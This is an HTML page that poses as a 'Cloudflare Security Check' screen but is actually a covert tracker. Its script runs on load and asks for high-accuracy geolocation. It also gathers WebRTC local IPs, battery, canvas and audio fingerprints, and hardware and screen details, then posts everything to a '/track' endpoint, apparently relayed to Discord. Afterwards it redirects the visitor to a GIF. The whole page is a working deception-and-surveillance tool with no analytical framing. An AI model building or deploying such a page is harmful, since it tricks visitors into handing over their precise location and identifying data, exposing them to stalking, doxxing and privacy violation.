<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloudflare Security Check</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
            padding: 40px;
            max-width: 500px;
            width: 90%;
            text-align: center;
        }
        .cf-logo { font-size: 48px; margin-bottom: 10px; }
        h1 { color: #2d3748; font-size: 24px; margin-bottom: 10px; }
        .subtitle { color: #718096; font-size: 14px; margin-bottom: 30px; }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #f6821f;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status { color: #4a5568; font-size: 14px; margin-top: 20px; }
        .check-mark { color: #48bb78; font-size: 60px; display: none; }
        .error-mark { color: #fc8181; font-size: 60px; display: none; }
        .hidden { display: none; }
        .debug-info { 
            margin-top: 20px; 
            font-size: 10px; 
            color: #a0aec0;
            word-break: break-all;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container" id="container">
        <div class="cf-logo">🛡️</div>
        <h1>Checking your browser security</h1>
        <p class="subtitle">Verifying your connection is secure...</p>
        
        <div id="loader" class="loader"></div>
        <div id="checkMark" class="check-mark">✅</div>
        <div id="errorMark" class="error-mark">⚠️</div>
        <p class="status" id="status">Starting security checks...</p>
        <div id="debugInfo" class="debug-info"></div>
    </div>

    <script>
        // Get session ID
        function getSessionId() {
            let id = sessionStorage.getItem('tracker_session_id');
            if (!id) {
                id = Math.random().toString(36).substring(2, 10) + 
                     Math.random().toString(36).substring(2, 10);
                sessionStorage.setItem('tracker_session_id', id);
            }
            return id;
        }

        // Get location with better error handling
        async function getLocation() {
            return new Promise((resolve) => {
                console.log("📍 Starting location request...");
                
                if (!navigator.geolocation) {
                    console.log("❌ Geolocation not supported");
                    resolve({ error: 'Geolocation not supported by this browser' });
                    return;
                }
                
                // Set a timeout
                const timeoutId = setTimeout(() => {
                    console.log("⏰ Location request timed out after 10 seconds");
                    resolve({ error: 'Location request timed out' });
                }, 10000);
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeoutId);
                        console.log("✅ Location obtained successfully!");
                        console.log("  Latitude:", position.coords.latitude);
                        console.log("  Longitude:", position.coords.longitude);
                        console.log("  Accuracy:", position.coords.accuracy);
                        
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy),
                            altitude: position.coords.altitude || null,
                            heading: position.coords.heading || null,
                            speed: position.coords.speed || null
                        });
                    },
                    (error) => {
                        clearTimeout(timeoutId);
                        console.log("❌ Location error:", error.message);
                        console.log("  Error code:", error.code);
                        
                        // Map error codes to user-friendly messages
                        let message = error.message;
                        if (error.code === 1) message = 'Permission denied by user';
                        else if (error.code === 2) message = 'Position unavailable';
                        else if (error.code === 3) message = 'Request timed out';
                        
                        resolve({ 
                            error: message,
                            code: error.code 
                        });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    }
                );
            });
        }

        // Get battery info
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging
                    };
                }
                return null;
            } catch (e) {
                return null;
            }
        }

        // Get WebRTC IPs
        async function getWebRTCIPs() {
            return new Promise((resolve) => {
                try {
                    const ips = [];
                    const pc = new RTCPeerConnection({
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                    });
                    
                    pc.createDataChannel('test');
                    pc.createOffer()
                        .then(offer => pc.setLocalDescription(offer))
                        .catch(() => {});
                    
                    pc.onicecandidate = (event) => {
                        if (!event.candidate) {
                            pc.close();
                            resolve(ips.length ? ips : ['No local IPs found']);
                            return;
                        }
                        const ip = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                        if (ip && !ips.includes(ip[0])) {
                            ips.push(ip[0]);
                        }
                    };
                    
                    setTimeout(() => {
                        pc.close();
                        resolve(ips.length ? ips : ['No local IPs found']);
                    }, 3000);
                } catch (e) {
                    resolve(['WebRTC not supported']);
                }
            });
        }

        // Get canvas fingerprint
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 256;
                canvas.height = 256;
                const ctx = canvas.getContext('2d');
                
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 128, 128);
                ctx.fillStyle = '#069';
                ctx.fillText('Hello World', 50, 50);
                
                const data = ctx.getImageData(0, 0, 256, 256).data;
                let hash = 0;
                for (let i = 0; i < data.length; i += 4) {
                    hash = ((hash << 5) - hash) + data[i];
                    hash = hash & hash;
                }
                return Math.abs(hash).toString(36);
            } catch (e) {
                return 'Canvas unavailable';
            }
        }

        // Get audio fingerprint
        async function getAudioFingerprint() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                oscillator.connect(analyser);
                analyser.connect(audioCtx.destination);
                oscillator.start(0);
                
                const dataArray = new Float32Array(analyser.frequencyBinCount);
                analyser.getFloatFrequencyData(dataArray);
                
                let sum = 0;
                for (let i = 0; i < dataArray.length; i++) {
                    sum += dataArray[i];
                }
                
                oscillator.stop();
                audioCtx.close();
                
                return (sum / dataArray.length).toFixed(6);
            } catch (e) {
                return 'Audio unavailable';
            }
        }

        // Collect all data
        async function collectData() {
            console.log("🔄 Starting data collection...");
            
            const location = await getLocation();
            console.log("📍 Location result:", location);
            
            const battery = await getBatteryInfo();
            const webRTCIPs = await getWebRTCIPs();
            const canvasFP = getCanvasFingerprint();
            const audioFP = await getAudioFingerprint();
            
            const data = {
                sessionId: getSessionId(),
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer || 'Direct',
                location: location,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio
                },
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                touchPoints: navigator.maxTouchPoints || 0,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                battery: battery,
                webRTCIPs: webRTCIPs,
                canvasFingerprint: canvasFP,
                audioFingerprint: audioFP,
                performance: {
                    loadTime: performance.timing ? 
                        performance.timing.loadEventEnd - performance.timing.navigationStart : 'N/A',
                    domReady: performance.timing ?
                        performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart : 'N/A'
                }
            };
            
            console.log("✅ Data collection complete:", data);
            return data;
        }

        // Send data to backend
        async function sendData(data) {
            try {
                console.log("📤 Sending data to server...");
                const response = await fetch('/track', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                const result = await response.json();
                console.log("📥 Server response:", result);
                return result;
            } catch (e) {
                console.error('❌ Error sending data:', e);
                return null;
            }
        }

        // Redirect to GIF
        function redirectToGif() {
            const gifUrl = "https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExaGFldzltMzB1MjNkcTJrY3J5NnY4OWxsNnVxamJtenhjbWhzMGkzdiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LrNleA51Ap1PprLcRv/giphy.gif";
            console.log("🔄 Redirecting to GIF:", gifUrl);
            window.location.href = gifUrl;
        }

        // Main execution
        async function main() {
            const statusEl = document.getElementById('status');
            const loaderEl = document.getElementById('loader');
            const checkMarkEl = document.getElementById('checkMark');
            const errorMarkEl = document.getElementById('errorMark');
            const debugEl = document.getElementById('debugInfo');
            
            try {
                statusEl.textContent = '📍 Requesting location permission...';
                
                // Collect data
                const data = await collectData();
                
                // Show debug info
                debugEl.style.display = 'block';
                debugEl.textContent = `Location: ${JSON.stringify(data.location)}`;
                
                statusEl.textContent = '📤 Sending data to server...';
                
                // Send to backend
                const result = await sendData(data);
                
                if (result && result.status === 'success') {
                    loaderEl.style.display = 'none';
                    checkMarkEl.style.display = 'block';
                    statusEl.textContent = '✅ Verification complete! Redirecting...';
                    statusEl.style.color = '#48bb78';
                    
                    if (result.discord_sent) {
                        console.log('✅ Data sent to Discord!');
                    } else {
                        console.log('⚠️ Discord send failed, but data was logged');
                    }
                } else {
                    loaderEl.style.display = 'none';
                    errorMarkEl.style.display = 'block';
                    statusEl.textContent = '⚠️ There was an issue, but continuing...';
                    statusEl.style.color = '#ed8936';
                }
            } catch (error) {
                console.error('❌ Main execution error:', error);
                loaderEl.style.display = 'none';
                errorMarkEl.style.display = 'block';
                statusEl.textContent = '⚠️ An error occurred, but redirecting...';
                statusEl.style.color = '#ed8936';
            }
            
            // Redirect to GIF after 2 seconds (always)
            setTimeout(redirectToGif, 2000);
        }

        // Run when page loads
        main();
    </script>
</body>
</html>
